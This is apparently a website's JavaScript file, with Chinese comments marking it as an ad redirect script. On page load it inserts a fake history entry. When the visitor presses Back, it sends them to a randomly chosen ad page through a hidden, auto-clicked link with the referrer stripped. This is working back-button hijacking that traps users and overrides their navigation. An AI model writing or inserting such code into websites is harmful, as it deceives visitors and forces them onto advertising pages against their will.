var globalLink = new Array();
var apidomain = '//' + location.hostname + '/';
// 广告
globalLink.push(apidomain + 'qysq.html');
globalLink.push(apidomain + 'tsyj.html');
globalLink.push(apidomain + 'xwfkys.html');
globalLink.push(apidomain + 'yysx.html');
globalLink.push(apidomain + 'zrl.html');
globalLink.push(apidomain + 'nkgg.html');
globalLink.push(apidomain + 'yx.html');

function hh() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}
window.onload = function(){
    setTimeout('hh();', 500);
};

// 后退
$(window).on('popstate', function(e){
    var number = Math.floor(globalLink.length * Math.random());
    var path = location.pathname.split('.')[0];
    if (path.substr(1) == 'nkgg') {
        number = 6;
    }
    jump(globalLink[number]);
});

// url跳转
function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}

/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function yellow() {
    jump(globalLink[Math.floor(globalLink.length * Math.random())]);
}
